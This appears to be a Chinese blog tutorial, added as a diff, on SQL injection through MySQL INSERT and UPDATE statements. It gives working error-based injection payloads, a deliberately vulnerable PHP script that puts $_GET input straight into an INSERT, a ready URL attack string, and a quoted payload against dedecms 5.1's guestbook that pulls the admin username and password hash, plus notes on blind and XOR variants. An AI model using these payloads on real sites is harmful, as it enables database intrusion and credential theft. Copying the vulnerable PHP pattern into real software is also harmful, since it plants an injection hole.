@@ -1,0 +1,115 @@
+By Ay 暗影
+ 
+很多人可能会问怎么又写这个玩意，之前不是写过了么。哟西，虽然原理一样，但是形 式还是有点不一样滴，而且此方法，貌似只适合 mysql，mssql 不行。至于其他的，我没试 过，也不熟悉。
+先回顾下之前的 insert 和本次的 insert 有和不同。
+INSERT INTO tbl_name SET column_name = [here]
+注入方法是 INSERT INTO tbl_name SET column_name = [here] xor(sql statment) or ‘
+本次注入形式是这样的，非常常见的模式，利用起来可行性高。
+Insert into tbl_name(col1,col2,col3,col4) values(xxx,xxxx,$_GET[id],xxx);
+一般都是这个形式吧，哈哈。
+原理，Mysql  支持在 value 中使用 select 子查询，但 mssql 不支持。 下面看我事例演示
+一、直接在 mysql 中操作
+insert into test(id,name,textcontents)
+values(1,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT version()))a from information_schema.tables group by a)b),xxxxxxxx);
+
+ 
+
+
+
+
+成功爆出我们想要的信息。 二、脚本演示
+为了证明俺自己的想法是可行的，特意自己写了一个有漏洞的脚本，在 apache +php +
+mysql  上测试了一下，是可行的，但是还是有点限制的，就是 php 代码要有 mysql 的输出错 误提示。mysql_query($sql) or die("Invalid query: " . mysql_error());  一般都有 die()函数，但有 些站也会不写，如果不写的话，就不能进行报错注入了。
+演示代码：
+==============php code===============
+<?php
+$host=www.2cto.com;
+$db_name=test;
+$user=root;
+ 
+$password=123456789;
+
+
+$sql="insert into t(id,name,msg) values(1,".$_GET[id].",msgmsgmsg)";
+echo "本次执行的语句是".$sql." <br>";
+$link=mysql_connect($host,$user,$password) or die("couldnt connect !".mysql_error());
+mysql_select_db($db_name,$link) or die("选择数据库失败".mysql_error());
+mysql_query($sql) or die("Invalid query: " . mysql_error());
+//echo $sql;
+echo "<br>数据库更新成功";
+mysql_close($link);
+?>
+==============mysql table=================== Create table t(id int,name char(255),msg char(255));
+==========================================
+结果截图
+
+
+演示语句
+inserti.php?id=test1,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT
+version()))a from information_schema.tables group by a)b))%23
+
+证明了俺的想法是对滴，哟西
+
+
+
+
+
+
+Mysql 关于insert和update语句的注入 
+2010-04-24 09:22 P.M.
+开始一直以为insert型的注入没什么用，不过看了下面文章大受启发，感谢作者：
+
+================================================
+
+dedecms5.1注入
+
+member_guestbook_action.php 
+
+$title = cn_substr(html2text($title),60); 
+$msg = cn_substr(stripslashes($msg),2048); 
+if($cfg_ml->M_UserName!="" && $cfg_ml->M_ID!=$uidnum) $gid = $cfg_ml->M_UserName; 
+else $gid = ''; 
+
+$inquery = " 
+   INSERT INTO #@__member_guestbook(mid,gid,title,msg,uname,email,qq,tel,ip,dtime) 
+   VALUES ('$uidnum','$gid','$title','$msg','$uname','$email','$qq','$tel','".GetIP()."',".mytime()."); 
+"; 
+一般的注射.. 
+cn_substr在别处有别的错.这里无所谓了. 
+
+空间留言: 
+cccccc',(select concat(userid,0x3a,pwd) from #@__admin limit 0,1),'','','','123',123)# 
+
+by jackal 
+
+================================================ 
+通过select，注册后显示在自己的资料中。如果不回显，还可以延迟注射或错误信息注射。
+
+同样适用于update。
+
+注意：mysql支持 insert into table VALUES (....),(......).(......) 带有多个括号的sql语句，这给insert注入带来了方便
+
+同时，insert类型的注入可以延迟注射和mysql显错注射的
+
+
+
+
+
+其实就是利用sql语句执行的先后顺序，在update或insert的时候，数据库引擎先计算set yyyy=XXXX XXXX后的值，然后再将该值插入到 yyyy里去。
+比如insert into whoami set id=1 xor(select 1);  //会正常的执行，并且会做异或运算 根据上边说过的执行顺序 1xor 1 =0 所以为flase 语句并没有插入。
+
+insert into whoami set id=1 xor(select 0);  1 xor 0 =1 为true 所以插入了id为1的列。因此我们可以利用mysql爆错语句来得到我们想要的内容。
+
+给两个爆错语句
+
+and exists(select * from ( select * from (select name_const(version(),0) )a join (select name_const(version(),0) )b )c )
+
+and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT version()))a from information_schema.tables group by a)b)
+
+或者先前发在我的博客的 mysql报错语句然后用 xor来让数据库报错 就是在条件语句 或者是set之后用xor(“报错语句”) 这样来执行 当然点也分数字型和字符型的 上边举例说的是数字型的 字符型的’XOR(XXXXX)OR’ 就OK了
+
+Back Top
+
+
+
+
